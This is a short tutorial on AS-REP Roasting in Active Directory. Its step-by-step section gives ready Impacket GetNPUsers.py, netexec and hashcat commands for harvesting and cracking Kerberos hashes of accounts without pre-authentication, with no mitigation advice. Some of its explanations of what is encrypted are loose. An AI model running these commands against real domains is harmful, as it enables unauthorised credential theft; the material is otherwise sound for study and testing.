AS-REP Roasting is an attack against **Kerberos authentication** in Active Directory (AD) that targets accounts with the property **“Do not require pre-authentication”**.  
It allows an attacker to request a **TGT (Ticket Granting Ticket)** for a user and obtain it **without knowing the user’s password**, then perform **offline password cracking**.

---

## Key Concepts

|Term|Explanation|
|---|---|
|**Kerberos AS-REP**|When a client requests a TGT from the Key Distribution Center (KDC) for a user without pre-authentication, the KDC returns an **encrypted blob** using the user’s long-term key.|
|**Pre-authentication**|By default, AD requires users to provide proof (encrypted timestamp) before issuing a TGT. Accounts with **“Do not require Kerberos pre-authentication”** bypass this check.|
|**Offline attack**|The TGT contains an **encrypted hash of the user’s password**. This can be cracked offline using tools like **Hashcat** or **John the Ripper**.|
## Attack Process

#### Step 1: Identify Vulnerable Accounts

- Use LDAP enumeration tools (e.g., `ldapsearch`, `BloodHound`) to find users with the **DONT_REQUIRE_PREAUTH** flag set.

Example using `GetNPUsers.py` from Impacket:
```bash
GetNPUsers.py <domain>/<user> -usersfile users.txt -dc-ip <dc-ip> -format hashcat
```

- This enumerates all users that do **not require pre-authentication** and outputs their AS-REP hashes.


#### Step 2: Request AS-REP TGTs

- For each identified user, request a TGT from the KDC:
```bash
GetNPUsers.py -request -dc-ip <dc-ip> <domain>/<user>
```

- The KDC returns a **TGT encrypted with the user’s password**.

You can also use the **netexec** command:
```bash
nxc ldap <dc_ip> -u <users.txt> -p '' --asreproast <output.txt>
```


#### Step 3: Extract and Save Hash

- The TGT is typically saved in **Kerberos ticket format** (`.kirbi`) or printed as a hash compatible with Hashcat.

Example output for Hashcat:
```bash
$krb5asrep$23$user@DOMAIN:encrypted_hash_here
```

#### Step 4: Crack the Password Offline

- Use password-cracking tools to recover the user’s password from the AS-REP hash:
```bash
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

